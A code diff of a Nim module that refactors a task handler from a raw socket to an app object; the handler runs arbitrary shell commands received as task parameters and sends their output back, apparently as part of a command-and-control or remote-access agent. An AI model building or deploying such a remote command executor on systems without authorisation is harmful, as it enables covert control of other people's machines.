@@ -1,7 +1,7 @@
 import osproc, os, net, strutils, json
-import ../client/communication
+import ../client/[communication, types]
 
-proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let toExec = params[0]
   let taskOutput = TaskOutput(
     task: "output",
@@ -16,11 +16,11 @@ proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
       let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
       setCurrentDir(newPath)
       taskOutput.addData(Text, "result", "changed current working directory to " & newPath)
-      socket.sendOutput(taskOutput)
+      app.sendOutput(taskOutput)
       return
     let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
     taskOutput.addData(Text, "result", output)
-    socket.sendOutput(taskOutput)
+    app.sendOutput(taskOutput)
   except OSError:
     taskOutput.error = getCurrentExceptionMsg()
-    socket.sendOutput(taskOutput)
+    app.sendOutput(taskOutput)
